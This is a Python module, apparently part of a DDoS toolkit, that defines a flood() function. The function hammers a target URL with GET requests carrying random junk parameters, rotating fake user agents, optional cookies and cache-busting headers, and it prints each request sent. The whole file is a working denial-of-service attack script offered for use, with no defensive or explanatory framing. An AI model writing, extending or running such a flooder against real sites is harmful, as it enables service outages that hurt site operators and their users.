# Import modules
import requests
import random
import tools.randomData as randomData
from colorama import Fore

# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

def flood(target, cookies=None, user_agent=None):
    # Choose a user agent dynamically if not provided
    chosen_user_agent = user_agent or random.choice(user_agents)

    # Set up the headers
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": chosen_user_agent,
    }

    # Add cookies to the headers if provided
    if cookies:
        headers["Cookie"] = cookies

    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        cookie_size = len(cookies) if cookies is not None else 0
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}[REQUEST SENT]{Fore.RESET} Payload Size: {len(payload)}{Fore.RESET} | {Fore.CYAN}Cookie Size: {cookie_size}{Fore.RESET} | {Fore.MAGENTA}UA: {chosen_user_agent}{Fore.RESET}"
        )
